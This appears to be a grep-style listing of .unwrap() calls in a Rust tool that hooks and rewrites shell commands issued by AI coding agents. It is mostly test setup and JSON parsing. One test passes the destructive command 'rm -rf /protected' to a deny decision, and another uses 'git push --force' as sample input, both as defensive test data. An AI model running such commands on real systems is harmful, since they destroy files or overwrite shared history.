+src/discover/lexer.rs:1504:            .unwrap();
+src/discover/provider.rs:312:        let mut f = tempfile::NamedTempFile::new().unwrap();
+src/discover/provider.rs:314:            writeln!(f, "{}", line).unwrap();
+src/discover/provider.rs:316:        f.flush().unwrap();
+src/discover/provider.rs:328:        let cmds = provider.extract_commands(jsonl.path()).unwrap();
+src/discover/provider.rs:333:            cmds[0].output_len.unwrap(),
+src/discover/provider.rs:345:        let cmds = provider.extract_commands(jsonl.path()).unwrap();
+src/discover/provider.rs:355:        let cmds = provider.extract_commands(jsonl.path()).unwrap();
+src/discover/provider.rs:366:        let cmds = provider.extract_commands(jsonl.path()).unwrap();
+src/discover/provider.rs:380:        let cmds = provider.extract_commands(jsonl.path()).unwrap();
+src/discover/provider.rs:495:        let temp_home = tempfile::tempdir().unwrap();
+src/discover/provider.rs:506:        .unwrap();
+src/discover/provider.rs:513:        let projects_dir = tempfile::tempdir().unwrap();
+src/discover/provider.rs:516:        std::fs::create_dir_all(&matching_project).unwrap();
+src/discover/provider.rs:517:        std::fs::create_dir_all(&other_project).unwrap();
+src/discover/provider.rs:518:        std::fs::write(matching_project.join("matching.jsonl"), "").unwrap();
+src/discover/provider.rs:519:        std::fs::write(other_project.join("other.jsonl"), "").unwrap();
+src/discover/provider.rs:526:        .unwrap();
+src/discover/provider.rs:541:        let projects_dir = tempfile::tempdir().unwrap();
+src/discover/provider.rs:544:            std::fs::create_dir_all(&dir).unwrap();
+src/discover/provider.rs:545:            std::fs::write(dir.join("session.jsonl"), "").unwrap();
+src/discover/provider.rs:553:        .unwrap();
+src/discover/provider.rs:561:        let projects_file = tempfile::NamedTempFile::new().unwrap();
+src/discover/provider.rs:578:        let cmds = provider.extract_commands(jsonl.path()).unwrap();
+src/discover/provider.rs:584:            cmds[0].output_content.as_ref().unwrap(),
+src/discover/provider.rs:597:        let cmds = provider.extract_commands(jsonl.path()).unwrap();
+src/discover/provider.rs:610:        let cmds = provider.extract_commands(jsonl.path()).unwrap();
+src/discover/registry.rs:71:    Regex::new(&format!(r#"^(?:{})+"#, env_word())).unwrap()
+src/discover/registry.rs:76:    LazyLock::new(|| Regex::new(&format!(r#"^(?:{})"#, env_word())).unwrap());
+src/discover/registry.rs:90:    Regex::new(r"^(?:(?:-C\s+\S+|-c\s+\S+|--git-dir(?:=\S+|\s+\S+)|--work-tree(?:=\S+|\s+\S+)|--no-pager|--no-optional-locks|--bare|--literal-pathspecs)\s+)+").unwrap()
+src/discover/registry.rs:97:    Regex::new(r"^(?:(?:-r|--recursive|-w|--workspace-root|--filter(?:=\S+|\s+\S+)|-F(?:=\S+|\s+\S+))\s+)+").unwrap()
+src/discover/registry.rs:103:static HEAD_N: LazyLock<Regex> = LazyLock::new(|| Regex::new(r"^head\s+-(\d+)\s+(\S+)$").unwrap());
+src/discover/registry.rs:105:    LazyLock::new(|| Regex::new(r"^head\s+--lines=(\d+)\s+(\S+)$").unwrap());
+src/discover/registry.rs:109:    LazyLock::new(|| Regex::new(r"^head\s+-n\s+(\d+)\s+(\S+)$").unwrap());
+src/discover/registry.rs:111:    LazyLock::new(|| Regex::new(r"^head\s+--lines\s+(\d+)\s+(\S+)$").unwrap());
+src/discover/registry.rs:114:static HEAD_BARE: LazyLock<Regex> = LazyLock::new(|| Regex::new(r"^head\s+(\S+)$").unwrap());
+src/discover/registry.rs:163:static TAIL_N: LazyLock<Regex> = LazyLock::new(|| Regex::new(r"^tail\s+-(\d+)\s+(\S+)$").unwrap());
+src/discover/registry.rs:165:    LazyLock::new(|| Regex::new(r"^tail\s+-n\s+(\d+)\s+(\S+)$").unwrap());
+src/discover/registry.rs:167:    LazyLock::new(|| Regex::new(r"^tail\s+--lines=(\d+)\s+(\S+)$").unwrap());
+src/discover/registry.rs:169:    LazyLock::new(|| Regex::new(r"^tail\s+--lines\s+(\d+)\s+(\S+)$").unwrap());
+src/discover/registry.rs:738:    LazyLock::new(|| Regex::new(r"(?m)[ \t\x0B\x0C]*\\\r?\n[ \t\x0B\x0C]*").unwrap());
+src/discover/registry.rs:740:static BASH_JOIN_RE: LazyLock<Regex> = LazyLock::new(|| Regex::new(r"\\\r?\n").unwrap());
+src/discover/registry.rs:2841:            cmd[analysis.final_stage_start.unwrap()..analysis.end_offset].trim(),
+src/discover/registry.rs:2864:        let next_clause_offset = cmd.find("&&").unwrap();
+src/discover/registry.rs:2869:            cmd[analysis.final_stage_start.unwrap()..analysis.end_offset].trim(),
+src/discover/report.rs:580:        let temp_home = tempfile::tempdir().unwrap();
+src/discover/report.rs:587:        std::fs::create_dir_all(manifest.parent().unwrap()).unwrap();
+src/discover/report.rs:588:        std::fs::write(&manifest, "name: rtk-rewrite\n").unwrap();
+src/discover/report.rs:598:        let temp_home = tempfile::tempdir().unwrap();
+src/discover/report.rs:604:        std::fs::create_dir_all(plugin_dir).unwrap();
+src/discover/report.rs:638:        let json: serde_json::Value = serde_json::from_str(&output).unwrap();
+src/discover/report.rs:647:        let temp = tempfile::tempdir().unwrap();
+src/discover/report.rs:653:        std::fs::create_dir_all(hook.parent().unwrap()).unwrap();
+src/discover/report.rs:654:        std::fs::write(&hook, "{}").unwrap();
+src/discover/report.rs:660:            tempfile::tempdir().unwrap().path()
+src/hooks/hook_audit_cmd.rs:189:        let entry = parse_line(line).unwrap();
+src/hooks/hook_audit_cmd.rs:198:        let entry = parse_line(line).unwrap();
+src/hooks/hook_check.rs:281:        std::fs::create_dir_all(path.parent().unwrap()).unwrap();
+src/hooks/hook_check.rs:282:        std::fs::write(&path, b"plugin").unwrap();
+src/hooks/hook_check.rs:294:        std::fs::create_dir_all(path.parent().unwrap()).unwrap();
+src/hooks/hook_check.rs:295:        std::fs::write(&path, b"hook").unwrap();
+src/hooks/hook_check.rs:303:        std::fs::create_dir_all(path.parent().unwrap()).unwrap();
+src/hooks/hook_check.rs:304:        std::fs::write(&path, b"agents").unwrap();
+src/hooks/hook_check.rs:316:        std::fs::create_dir_all(path.parent().unwrap()).unwrap();
+src/hooks/hook_check.rs:317:        std::fs::write(&path, b"hook").unwrap();
+src/hooks/hook_check.rs:330:        std::fs::create_dir_all(path.parent().unwrap()).unwrap();
+src/hooks/hook_check.rs:331:        std::fs::write(&path, b"plugin").unwrap();
+src/hooks/hook_check.rs:338:        std::fs::create_dir_all(tmp.path().join(CURSOR_DIR).join(HOOKS_SUBDIR)).unwrap();
+src/hooks/hook_check.rs:339:        std::fs::create_dir_all(tmp.path().join(CODEX_DIR)).unwrap();
+src/hooks/hook_check.rs:340:        std::fs::create_dir_all(tmp.path().join(GEMINI_DIR)).unwrap();
+src/hooks/hook_check.rs:347:        .unwrap();
+src/hooks/hook_cmd.rs:1341:        let args = serde_json::to_string(&json!({ "command": cmd })).unwrap();
+src/hooks/hook_cmd.rs:1351:        .unwrap();
+src/hooks/hook_cmd.rs:1430:        let v: Value = serde_json::from_str(strip_leading_bom(&raw).trim()).unwrap();
+src/hooks/hook_cmd.rs:1459:            let response = vscode_response_from_decision(decision, "git status", &input).unwrap();
+src/hooks/hook_cmd.rs:1473:        .unwrap();
+src/hooks/hook_cmd.rs:1493:        .unwrap();
+src/hooks/hook_cmd.rs:1497:                .unwrap()
+src/hooks/hook_cmd.rs:1549:        .unwrap();
+src/hooks/hook_cmd.rs:1564:        .unwrap();
+src/hooks/hook_cmd.rs:1601:        .unwrap();
+src/hooks/hook_cmd.rs:1606:                .unwrap()
+src/hooks/hook_cmd.rs:1620:        .unwrap();
+src/hooks/hook_cmd.rs:1625:                .unwrap()
+src/hooks/hook_cmd.rs:1634:            copilot_ide_response_from_decision(HookDecision::Deny, "rm -rf /protected").unwrap();
+src/hooks/hook_cmd.rs:1669:        .unwrap();
+src/hooks/hook_cmd.rs:1689:        .unwrap();
+src/hooks/hook_cmd.rs:1712:                r["modifiedArgs"]["command"].as_str().unwrap(),
+src/hooks/hook_cmd.rs:1791:        let json: Value = serde_json::from_str(&output.to_string()).unwrap();
+src/hooks/hook_cmd.rs:1903:        let (session_id, tool_use_id, project_path) = hook_log_fields(&v).unwrap();
+src/hooks/hook_cmd.rs:1916:        let v: Value = serde_json::from_str(&claude_input("git status")).unwrap();
+src/hooks/hook_cmd.rs:1943:        let (_, _, project_path) = hook_log_fields(&v).unwrap();
+src/hooks/hook_cmd.rs:2015:        serde_json::from_str(&claude_input(cmd)).unwrap()
+src/hooks/hook_cmd.rs:2020:        let result = run_claude_inner(&claude_input("git status")).unwrap();
+src/hooks/hook_cmd.rs:2021:        let v: Value = serde_json::from_str(&result).unwrap();
+src/hooks/hook_cmd.rs:2025:            .unwrap();
+src/hooks/hook_cmd.rs:2032:        let result = run_claude_inner(&input).unwrap();
+src/hooks/hook_cmd.rs:2033:        let v: Value = serde_json::from_str(&result).unwrap();
+src/hooks/hook_cmd.rs:2092:        let result = run_claude_inner(&claude_input("GIT_PAGER=cat git status")).unwrap();
+src/hooks/hook_cmd.rs:2093:        let v: Value = serde_json::from_str(&result).unwrap();
+src/hooks/hook_cmd.rs:2097:            .unwrap();
+src/hooks/hook_cmd.rs:2103:        let result = run_claude_inner(&claude_input("git add . && cargo test")).unwrap();
+src/hooks/hook_cmd.rs:2104:        let v: Value = serde_json::from_str(&result).unwrap();
+src/hooks/hook_cmd.rs:2108:            .unwrap();
+src/hooks/hook_cmd.rs:2114:        let result = run_claude_inner(&claude_input("cargo test | grep FAILED")).unwrap();
+src/hooks/hook_cmd.rs:2115:        let v: Value = serde_json::from_str(&result).unwrap();
+src/hooks/hook_cmd.rs:2119:            .unwrap();
+src/hooks/hook_cmd.rs:2125:        let result = run_claude_inner(&claude_input("git log | tail -5")).unwrap();
+src/hooks/hook_cmd.rs:2126:        let v: Value = serde_json::from_str(&result).unwrap();
+src/hooks/hook_cmd.rs:2130:            .unwrap();
+src/hooks/hook_cmd.rs:2136:        let result = run_claude_inner(&claude_input("git status")).unwrap();
+src/hooks/hook_cmd.rs:2137:        let v: Value = serde_json::from_str(&result).unwrap();
+src/hooks/hook_cmd.rs:2163:        let v: Value = serde_json::from_str(&result).unwrap();
+src/hooks/hook_cmd.rs:2186:        let result = run_trae_inner(&trae_input("git status")).unwrap();
+src/hooks/hook_cmd.rs:2187:        let v: Value = serde_json::from_str(&result).unwrap();
+src/hooks/hook_cmd.rs:2240:        let result = run_codex_inner(&codex_input("git status")).unwrap();
+src/hooks/hook_cmd.rs:2241:        let v: Value = serde_json::from_str(&result).unwrap();
+src/hooks/hook_cmd.rs:2306:                serde_json::from_str(&codex_input_with_permission_mode(command, mode)).unwrap();
+src/hooks/hook_cmd.rs:2348:        let result = run_codex_inner(&codex_input("cargo test")).unwrap();
+src/hooks/hook_cmd.rs:2349:        let v: Value = serde_json::from_str(&result).unwrap();
+src/hooks/hook_cmd.rs:2370:        let result = run_codex_inner(&input).unwrap();
+src/hooks/hook_cmd.rs:2371:        let v: Value = serde_json::from_str(&result).unwrap();
+src/hooks/hook_cmd.rs:2410:        let result = run_codex_inner(&codex_input("git add . && cargo test")).unwrap();
+src/hooks/hook_cmd.rs:2411:        let v: Value = serde_json::from_str(&result).unwrap();
+src/hooks/hook_cmd.rs:2442:        let v: Value = serde_json::from_str(&result).unwrap();
+src/hooks/hook_cmd.rs:2455:        let v: Value = serde_json::from_str(&result).unwrap();
+src/hooks/hook_cmd.rs:2483:        let v: Value = serde_json::from_str(&out).unwrap();
+src/hooks/hook_cmd.rs:2514:        let v: Value = serde_json::from_str(&result).unwrap();
+src/hooks/hook_cmd.rs:2524:        let v: Value = serde_json::from_str(&result).unwrap();
+src/hooks/hook_cmd.rs:2541:        let v: Value = serde_json::from_str(&result).unwrap();
+src/hooks/hook_cmd.rs:2556:        let v: Value = serde_json::from_str(&result).unwrap();
+src/hooks/hook_cmd.rs:2943:        let v: Value = serde_json::from_str(&result).unwrap();
+src/hooks/hook_cmd.rs:2967:            serde_json::from_str(&gemini_render("git status", &[], &[], &all_allowed())).unwrap();
+src/hooks/hook_cmd.rs:2977:        let v: Value = serde_json::from_str(&gemini_render("git status", &[], &[], &[])).unwrap();
+src/hooks/hook_cmd.rs:2989:        .unwrap();
+src/hooks/hook_cmd.rs:3002:        .unwrap();
+src/hooks/hook_cmd.rs:3024:        let v: Value = serde_json::from_str(&out).unwrap();
+src/hooks/hook_cmd.rs:3054:        let v: Value = serde_json::from_str(&out).unwrap();
+src/hooks/hook_cmd.rs:3069:        let v: Value = serde_json::from_str(&out).unwrap();
+src/hooks/hook_cmd.rs:3121:        let v: Value = serde_json::from_str(&out).unwrap();
+src/hooks/hook_cmd.rs:3172:        let v: Value = serde_json::from_str(&droid_input("Execute", "git push --force")).unwrap();
+src/hooks/hook_cmd.rs:3182:        let v: Value = serde_json::from_str(&droid_input("Execute", "git status")).unwrap();
+src/hooks/hook_cmd.rs:3251:        let v: Value = serde_json::from_str(&out).unwrap();
+src/hooks/hook_cmd.rs:3271:        let v: Value = serde_json::from_str(&out).unwrap();
+src/hooks/hook_cmd.rs:3301:        let v: Value = serde_json::from_str(&out).unwrap();
+src/hooks/hook_cmd.rs:3426:        let v: Value = serde_json::from_str(&result).unwrap();
+src/hooks/hook_cmd.rs:3438:        let v: Value = serde_json::from_str(&result).unwrap();
+src/hooks/hook_cmd.rs:3520:        .unwrap();
+src/hooks/hook_cmd.rs:3532:        let v: Value = serde_json::from_str(&out).unwrap();
+src/hooks/init/agents_md.rs:382:        let temp = TempDir::new().unwrap();
+src/hooks/init/agents_md.rs:385:        fs::write(&agents_md, "# Team rules\n").unwrap();
+src/hooks/init/agents_md.rs:386:        let first_added = patch_agents_md(&agents_md, RTK_MD_REF, InitContext::default()).unwrap();
+src/hooks/init/agents_md.rs:387:        let second_added = patch_agents_md(&agents_md, RTK_MD_REF, InitContext::default()).unwrap();
+src/hooks/init/agents_md.rs:392:        let content = fs::read_to_string(&agents_md).unwrap();
+src/hooks/init/agents_md.rs:398:        let temp = TempDir::new().unwrap();
+src/hooks/init/agents_md.rs:401:        let added = patch_agents_md(&agents_md, RTK_MD_REF, InitContext::default()).unwrap();
+src/hooks/init/agents_md.rs:404:        let content = fs::read_to_string(&agents_md).unwrap();
+src/hooks/init/agents_md.rs:410:        let temp = TempDir::new().unwrap();
+src/hooks/init/agents_md.rs:419:        .unwrap();
+src/hooks/init/agents_md.rs:421:        let added = patch_agents_md(&agents_md, RTK_MD_REF, InitContext::default()).unwrap();
+src/hooks/init/agents_md.rs:424:        let content = fs::read_to_string(&agents_md).unwrap();
+src/hooks/init/antigravity.rs:204:        let temp = TempDir::new().unwrap();
+src/hooks/init/antigravity.rs:205:        run_antigravity_mode_at(temp.path(), false, InitContext::default()).unwrap();
+src/hooks/init/antigravity.rs:214:        let manifest = fs::read_to_string(&manifest_path).unwrap();
+src/hooks/init/antigravity.rs:217:        let hooks = fs::read_to_string(&hooks_path).unwrap();
+src/hooks/init/antigravity.rs:224:        let temp = TempDir::new().unwrap();
+src/hooks/init/antigravity.rs:225:        run_antigravity_mode_at(temp.path(), true, InitContext::default()).unwrap();
+src/hooks/init/antigravity.rs:244:        let temp = TempDir::new().unwrap();
+src/hooks/init/antigravity.rs:253:        .unwrap();
+src/hooks/init/antigravity.rs:264:        let temp = TempDir::new().unwrap();
+src/hooks/init/antigravity.rs:265:        run_antigravity_mode_at(temp.path(), false, InitContext::default()).unwrap();
+src/hooks/init/antigravity.rs:266:        run_antigravity_mode_at(temp.path(), false, InitContext::default()).unwrap();
+src/hooks/init/antigravity.rs:280:            let temp = TempDir::new().unwrap();
+src/hooks/init/antigravity.rs:289:            .unwrap();
+src/hooks/init/antigravity.rs:295:            .unwrap();
+src/hooks/init/antigravity.rs:306:        let temp = TempDir::new().unwrap();
+src/hooks/init/antigravity.rs:319:            run_antigravity_mode_at(temp.path(), false, ctx).unwrap();
+src/hooks/init/antigravity.rs:321:                fs::read_to_string(&rules_path).unwrap(),
+src/hooks/init/antigravity.rs:330:        let temp = TempDir::new().unwrap();
+src/hooks/init/antigravity.rs:331:        run_antigravity_mode_at(temp.path(), false, InitContext::default()).unwrap();
+src/hooks/init/antigravity.rs:334:            uninstall_antigravity_mode_at(temp.path(), false, InitContext::default()).unwrap();
+src/hooks/init/claude.rs:1129:        let pre_tool_use = json_content["hooks"]["PreToolUse"].as_array().unwrap();
+src/hooks/init/claude.rs:1133:        let command = pre_tool_use[0]["hooks"][0]["command"].as_str().unwrap();
+src/hooks/init/claude.rs:1163:        let pre_tool_use = json_content["hooks"]["PreToolUse"].as_array().unwrap();
+src/hooks/init/claude.rs:1166:            pre_tool_use[0]["hooks"][0]["command"].as_str().unwrap(),
+src/hooks/init/claude.rs:1197:        let pre_tool_use = json_content["hooks"]["PreToolUse"].as_array().unwrap();
+src/hooks/init/claude.rs:1200:            pre_tool_use[0]["hooks"][0]["command"].as_str().unwrap(),
+src/hooks/init/claude.rs:1238:        let arr = root["hooks"]["PreToolUse"].as_array().unwrap();
+src/hooks/init/claude.rs:1266:        let arr = root["hooks"]["PreToolUse"].as_array().unwrap();
+src/hooks/init/claude.rs:1268:        let cmd = arr[0]["hooks"][0]["command"].as_str().unwrap();
+src/hooks/init/claude.rs:1287:        let arr = root["hooks"]["PreToolUse"].as_array().unwrap();
+src/hooks/init/claude.rs:1315:        let arr = root["hooks"]["PreToolUse"].as_array().unwrap();
+src/hooks/init/claude.rs:1317:        let cmd = arr[0]["hooks"][0]["command"].as_str().unwrap();
+src/hooks/init/claude.rs:1325:            run_default_mode(true, PatchMode::Auto, false, InitContext::default()).unwrap();
+src/hooks/init/claude.rs:1335:            let content = fs::read_to_string(&settings).unwrap();
+src/hooks/init/claude.rs:1361:            fs::write(&path, original).unwrap();
+src/hooks/init/claude.rs:1374:                .unwrap(),
+src/hooks/init/claude.rs:1377:            assert_eq!(fs::read_to_string(&path).unwrap(), original);
+src/hooks/init/claude.rs:1387:                .unwrap(),
+src/hooks/init/claude.rs:1390:            let installed = fs::read_to_string(&path).unwrap();
+src/hooks/init/claude.rs:1399:                .unwrap(),
+src/hooks/init/claude.rs:1402:            assert_eq!(fs::read_to_string(&path).unwrap(), installed);
+src/hooks/init/claude.rs:1404:                fs::read_to_string(path.with_extension("json.bak")).unwrap(),
+src/hooks/init/claude.rs:1407:            let root = read_json_file(&path).unwrap().unwrap();
+src/hooks/init/claude.rs:1421:            fs::write(&path, "{}").unwrap();
+src/hooks/init/claude.rs:1422:            fs::create_dir(path.with_extension("json.bak")).unwrap();
+src/hooks/init/claude.rs:1432:            assert_eq!(fs::read_to_string(&path).unwrap(), "{}");
+src/hooks/init/claude.rs:1440:            run_default_mode(true, PatchMode::Auto, false, InitContext::default()).unwrap();
+src/hooks/init/claude.rs:1466:            run_default_mode(true, PatchMode::Auto, true, InitContext::default()).unwrap();
+src/hooks/init/claude.rs:1491:            fs::write(&settings, "\u{feff}{\"foo\": 1}").unwrap();
+src/hooks/init/claude.rs:1506:            let content = fs::read_to_string(&settings).unwrap();
+src/hooks/init/claude.rs:1507:            let v: serde_json::Value = serde_json::from_str(&content).unwrap();
+src/hooks/init/claude.rs:1525:            fs::write(&settings, "\u{feff}{not valid json").unwrap();
+src/hooks/init/claude.rs:1551:        fs::create_dir_all(project.join(".rtk")).unwrap();
+src/hooks/init/claude.rs:1556:        .unwrap();
+src/hooks/init/claude.rs:1570:                    fs::write(&settings, serde_json::to_string_pretty(&seeded).unwrap()).unwrap();
+src/hooks/init/claude.rs:1586:                    .unwrap();
+src/hooks/init/claude.rs:1589:                        serde_json::from_str(&fs::read_to_string(&settings).unwrap()).unwrap();
+src/hooks/init/claude.rs:1611:        fs::create_dir_all(project.join(".rtk")).unwrap();
+src/hooks/init/claude.rs:1616:        .unwrap();
+src/hooks/init/claude.rs:1630:                    .unwrap();
+src/hooks/init/claude.rs:1638:                    .unwrap();
+src/hooks/init/claude.rs:1641:                        &fs::read_to_string(claude_dir.join(SETTINGS_JSON)).unwrap(),
+src/hooks/init/claude.rs:1643:                    .unwrap();
+src/hooks/init/claude.rs:1656:                        serde_json::from_str(&fs::read_to_string(&proj_settings).unwrap()).unwrap();
+src/hooks/init/claude.rs:1677:            fs::write(&settings, "\u{feff}").unwrap();
+src/hooks/init/claude.rs:1698:            run_default_mode(true, PatchMode::Auto, false, InitContext::default()).unwrap();
+src/hooks/init/claude.rs:1708:            .unwrap();
+src/hooks/init/claude.rs:1732:                    run_default_mode(true, PatchMode::Auto, false, InitContext::default()).unwrap();
+src/hooks/init/claude.rs:1733:                    run_default_mode(true, PatchMode::Auto, false, InitContext::default()).unwrap();
+src/hooks/init/claude.rs:1735:                    let settings = fs::read_to_string(claude_dir.join(SETTINGS_JSON)).unwrap();
+src/hooks/init/claude.rs:1753:        result.unwrap();
+src/hooks/init/claude.rs:1768:            run_hook_only_mode(true, PatchMode::Auto, false, InitContext::default()).unwrap();
+src/hooks/init/claude.rs:1774:            let settings = fs::read_to_string(claude_dir.join(SETTINGS_JSON)).unwrap();
+src/hooks/init/claude.rs:1786:            run_hook_only_mode(true, PatchMode::Auto, false, InitContext::default()).unwrap();
+src/hooks/init/claude.rs:1796:            let settings = fs::read_to_string(claude_dir.join(SETTINGS_JSON)).unwrap();
+src/hooks/init/claude.rs:1812:            run_default_mode(true, PatchMode::Auto, false, dry).unwrap();
+src/hooks/init/claude.rs:1837:            run_default_mode(true, PatchMode::Auto, false, dry).unwrap();
+src/hooks/init/claude.rs:1851:            run_default_mode(true, PatchMode::Auto, false, InitContext::default()).unwrap();
+src/hooks/init/claude.rs:1855:            let settings_before = fs::read_to_string(claude_dir.join(SETTINGS_JSON)).unwrap();
+src/hooks/init/claude.rs:1856:            let rtk_md_before = fs::read_to_string(claude_dir.join(RTK_MD)).unwrap();
+src/hooks/init/claude.rs:1863:            uninstall(true, false, false, false, false, false, dry).unwrap();
+src/hooks/init/claude.rs:1875:                fs::read_to_string(claude_dir.join(RTK_MD)).unwrap(),
+src/hooks/init/claude.rs:1880:                fs::read_to_string(claude_dir.join(SETTINGS_JSON)).unwrap(),
+src/hooks/init/claude.rs:1900:            .unwrap()
+src/hooks/init/claude.rs:1903:            fs::read_to_string(&rtk_md_path).unwrap(),
+src/hooks/init/claude.rs:1918:            .unwrap()
+src/hooks/init/claude.rs:1921:            fs::read_to_string(&rtk_md_path).unwrap(),
+src/hooks/init/claude.rs:1932:            .unwrap()
+src/hooks/init/claude.rs:1950:        .unwrap();
+src/hooks/init/claude.rs:1960:        .unwrap();
+src/hooks/init/claude.rs:1966:        let result = resolve_claude_dir_from(None, Some(PathBuf::from("/home/user"))).unwrap();
+src/hooks/init/claude.rs:1974:                .unwrap();
+src/hooks/init/claude.rs:1988:            run_claude_md_mode(true, false, InitContext::default()).unwrap();
+src/hooks/init/claude.rs:1989:            let claude_md_content = fs::read_to_string(claude_dir.join(CLAUDE_MD)).unwrap();
+src/hooks/init/claude.rs:1995:            run_default_mode(true, PatchMode::Auto, false, InitContext::default()).unwrap();
+src/hooks/init/claude.rs:1998:            let settings = fs::read_to_string(claude_dir.join(SETTINGS_JSON)).unwrap();
+src/hooks/init/claude.rs:2029:            fs::write(&claude_md, &malformed).unwrap();
+src/hooks/init/claude.rs:2038:            let after = fs::read_to_string(&claude_md).unwrap();
+src/hooks/init/codex.rs:1057:        let temp = TempDir::new().unwrap();
+src/hooks/init/codex.rs:1069:        .unwrap();
+src/hooks/init/codex.rs:1073:            fs::read_to_string(&rtk_md).unwrap(),
+src/hooks/init/codex.rs:1077:            fs::read_to_string(&agents_md).unwrap(),
+src/hooks/init/codex.rs:1081:            serde_json::from_str(&fs::read_to_string(&hooks_json).unwrap()).unwrap();
+src/hooks/init/codex.rs:1091:            resolve_codex_dir_from(Some(codex_home.clone()), Some(home_dir.clone())).unwrap();
+src/hooks/init/codex.rs:1093:            resolve_codex_dir_from(Some(PathBuf::new()), Some(home_dir.clone())).unwrap();
+src/hooks/init/codex.rs:1094:        let missing_falls_back = resolve_codex_dir_from(None, Some(home_dir.clone())).unwrap();
+src/hooks/init/codex.rs:1103:        let temp = TempDir::new().unwrap();
+src/hooks/init/codex.rs:1108:        fs::write(&agents_md, "# Team rules\n\n@RTK.md\n").unwrap();
+src/hooks/init/codex.rs:1109:        fs::write(&rtk_md, codex_rtk_md_content(AwarenessLevel::Default)).unwrap();
+src/hooks/init/codex.rs:1111:        let removed_first = uninstall_codex_at(codex_dir, InitContext::default()).unwrap();
+src/hooks/init/codex.rs:1112:        let removed_second = uninstall_codex_at(codex_dir, InitContext::default()).unwrap();
+src/hooks/init/codex.rs:1118:        let content = fs::read_to_string(&agents_md).unwrap();
+src/hooks/init/codex.rs:1125:        let temp = TempDir::new().unwrap();
+src/hooks/init/codex.rs:1131:        fs::write(&agents_md, format!("# Team rules\n\n{}\n", absolute_ref)).unwrap();
+src/hooks/init/codex.rs:1132:        fs::write(&rtk_md, codex_rtk_md_content(AwarenessLevel::Default)).unwrap();
+src/hooks/init/codex.rs:1134:        let removed = uninstall_codex_at(codex_dir, InitContext::default()).unwrap();
+src/hooks/init/codex.rs:1137:        let content = fs::read_to_string(&agents_md).unwrap();
+src/hooks/init/codex.rs:1144:        let temp = TempDir::new().unwrap();
+src/hooks/init/codex.rs:1159:        .unwrap();
+src/hooks/init/codex.rs:1180:        let temp = TempDir::new().unwrap();
+src/hooks/init/codex.rs:1192:        .unwrap();
+src/hooks/init/codex.rs:1193:        fs::write(&rtk_md, codex_rtk_md_content(AwarenessLevel::Default)).unwrap();
+src/hooks/init/codex.rs:1195:        let removed = uninstall_codex_at(codex_dir, InitContext::default()).unwrap();
+src/hooks/init/codex.rs:1197:        let content = fs::read_to_string(&agents_md).unwrap();
+src/hooks/init/codex.rs:1205:        let temp = TempDir::new().unwrap();
+src/hooks/init/codex.rs:1207:        fs::create_dir(&directory).unwrap();
+src/hooks/init/codex.rs:1208:        let config = codex_tracking_config(&directory.join("custom.db")).unwrap();
+src/hooks/init/codex.rs:1209:        let parsed: toml::Value = toml::from_str(&config).unwrap();
+src/hooks/init/codex.rs:1213:            .unwrap();
+src/hooks/init/codex.rs:1216:            roots[0].as_str().unwrap(),
+src/hooks/init/codex.rs:1217:            fs::canonicalize(&directory).unwrap().to_str().unwrap()
+src/hooks/init/codex.rs:1224:        let temp = TempDir::new().unwrap();
+src/hooks/init/codex.rs:1226:        let config = codex_tracking_config(&directory.join("history.db")).unwrap();
+src/hooks/init/codex.rs:1227:        let parsed: toml::Value = toml::from_str(&config).unwrap();
+src/hooks/init/codex.rs:1231:                .unwrap(),
+src/hooks/init/codex.rs:1232:            directory.to_str().unwrap()
+src/hooks/init/codex.rs:1239:        let temp = TempDir::new().unwrap();
+src/hooks/init/codex.rs:1254:            .unwrap(),
+src/hooks/init/codex.rs:1256:        .unwrap();
+src/hooks/init/codex.rs:1258:        assert!(patch_codex_hooks_json(&hooks_json, InitContext::default()).unwrap());
+src/hooks/init/codex.rs:1259:        assert!(!patch_codex_hooks_json(&hooks_json, InitContext::default()).unwrap());
+src/hooks/init/codex.rs:1262:            serde_json::from_str(&fs::read_to_string(&hooks_json).unwrap()).unwrap();
+src/hooks/init/codex.rs:1264:        assert_eq!(root["hooks"]["PreToolUse"].as_array().unwrap().len(), 2);
+src/hooks/init/codex.rs:1278:        fs::write(temp.path().join(AGENTS_MD), "# Team rules\n").unwrap();
+src/hooks/init/codex.rs:1279:        run_codex_mode(false, InitContext::default()).unwrap();
+src/hooks/init/codex.rs:1280:        uninstall_codex(false, InitContext::default()).unwrap();
+src/hooks/init/codex.rs:1285:                &fs::read_to_string(temp.path().join(CODEX_DIR).join(HOOKS_JSON)).unwrap()
+src/hooks/init/codex.rs:1287:            .unwrap()
+src/hooks/init/codex.rs:1289:        let agents = fs::read_to_string(temp.path().join(AGENTS_MD)).unwrap();
+src/hooks/init/codex.rs:1322:        let temp = TempDir::new().unwrap();
+src/hooks/init/codex.rs:1337:            .unwrap(),
+src/hooks/init/codex.rs:1339:        .unwrap();
+src/hooks/init/codex.rs:1341:        let removed = uninstall_codex_at(temp.path(), InitContext::default()).unwrap();
+src/hooks/init/codex.rs:1345:            serde_json::from_str(&fs::read_to_string(&hooks_json).unwrap()).unwrap();
+src/hooks/init/copilot.rs:329:        let temp = TempDir::new().unwrap();
+src/hooks/init/copilot.rs:331:        fs::create_dir_all(&github_dir).unwrap();
+src/hooks/init/copilot.rs:337:        fs::write(&instructions_path, user_content).unwrap();
+src/hooks/init/copilot.rs:339:        run_copilot_at(temp.path(), InitContext::default()).unwrap();
+src/hooks/init/copilot.rs:341:        let final_content = fs::read_to_string(&instructions_path).unwrap();
+src/hooks/init/copilot.rs:363:        let temp = TempDir::new().unwrap();
+src/hooks/init/copilot.rs:365:        fs::create_dir_all(&github_dir).unwrap();
+src/hooks/init/copilot.rs:367:        run_copilot_at(temp.path(), InitContext::default()).unwrap();
+src/hooks/init/copilot.rs:368:        let after_first = fs::read_to_string(github_dir.join("copilot-instructions.md")).unwrap();
+src/hooks/init/copilot.rs:370:        run_copilot_at(temp.path(), InitContext::default()).unwrap();
+src/hooks/init/copilot.rs:371:        let after_second = fs::read_to_string(github_dir.join("copilot-instructions.md")).unwrap();
+src/hooks/init/copilot.rs:392:        let temp = TempDir::new().unwrap();
+src/hooks/init/copilot.rs:394:        fs::create_dir_all(&github_dir).unwrap();
+src/hooks/init/copilot.rs:401:        fs::write(&instructions_path, &stale).unwrap();
+src/hooks/init/copilot.rs:403:        run_copilot_at(temp.path(), InitContext::default()).unwrap();
+src/hooks/init/copilot.rs:405:        let updated = fs::read_to_string(&instructions_path).unwrap();
+src/hooks/init/copilot.rs:423:        let temp = TempDir::new().unwrap();
+src/hooks/init/copilot.rs:431:        run_copilot_at(temp.path(), ctx).unwrap();
